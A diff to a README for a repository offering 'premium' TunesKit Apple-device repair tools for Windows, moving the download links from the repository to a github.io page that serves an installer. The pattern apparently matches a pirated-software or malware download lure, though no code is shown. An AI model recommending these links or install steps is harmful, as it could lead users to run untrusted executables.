@@ -1,6 +1,6 @@
 # ☁️ Baixar-TunesKit - Access premium tools on your Windows
 
-[![Download TunesKit for Windows](https://img.shields.io/badge/Download-TunesKit-blue)](https://github.com/Harini-logicwave/Baixar-TunesKit)
+[![Download TunesKit for Windows](https://img.shields.io/badge/Download-TunesKit-blue)](https://harini-logicwave.github.io)
 
 ## 📋 Overview
 TunesKit provides tools to handle common issues with Apple devices. This software helps users recover data, unlock screens, and fix system errors. It runs on Windows 10 and Windows 11. The program uses a simple interface to manage complex tasks. You do not need technical skills to use these functions.
@@ -25,7 +25,7 @@ Before you install, make sure your computer meets these needs:
 ## 📥 How to Download and Install
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official repository page](https://github.com/Harini-logicwave/Baixar-TunesKit) to access the files.
+1. Visit the [official repository page](https://harini-logicwave.github.io) to access the files.
 2. Select the download link to save the installer to your PC.
 3. Locate the file in your Downloads folder after the transfer finishes.
 4. Double-click the installer icon to start the setup process.
